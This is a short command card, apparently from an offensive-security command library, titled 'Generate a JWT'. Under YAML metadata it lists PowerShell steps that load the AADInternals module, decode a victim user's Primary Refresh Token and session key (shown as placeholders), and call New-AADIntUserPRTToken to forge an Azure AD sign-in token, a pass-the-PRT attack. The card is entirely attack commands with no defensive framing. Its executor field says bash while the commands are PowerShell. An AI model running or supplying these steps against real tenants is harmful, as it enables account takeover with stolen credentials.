---
id: cb579ab9-34db-4abe-a096-add337d93fb0
name: Generate a JWT
type: command
executor: bash
data: '# Generate a JWT

  PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1

  PS AADInternals> $PRT_OF_USER = ''...''

  PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}

  PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))

  PS AADInternals> $ClearKey = "XXYYZZ..."

  PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace
  ''..'', ''0x$&,'' -split '','' -ne ''''))

  PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce'
output: null
created_at: '2023-05-25T16:44:24.681560+00:00'
updated_at: '2023-05-25T17:03:04.293884+00:00'
---

# Generate a JWT

```bash
# Generate a JWT
PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
PS AADInternals> $PRT_OF_USER = '...'
PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
PS AADInternals> $ClearKey = "XXYYZZ..."
PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
```
